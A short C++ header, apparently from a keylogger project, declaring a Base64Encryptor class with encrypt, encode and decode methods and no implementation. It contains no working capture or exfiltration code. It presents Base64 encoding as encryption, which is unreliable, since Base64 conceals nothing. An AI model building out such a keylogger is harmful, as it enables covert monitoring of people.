#pragma once

#include "Encryptor.h"

namespace keylogger
{
class Base64Encryptor : public Encryptor
{
public:
    std::string encrypt(const std::string&) const override;

private:
    std::string encodeBase64(const std::string&) const;
    std::string decodeBase64(const std::string&) const;
};
}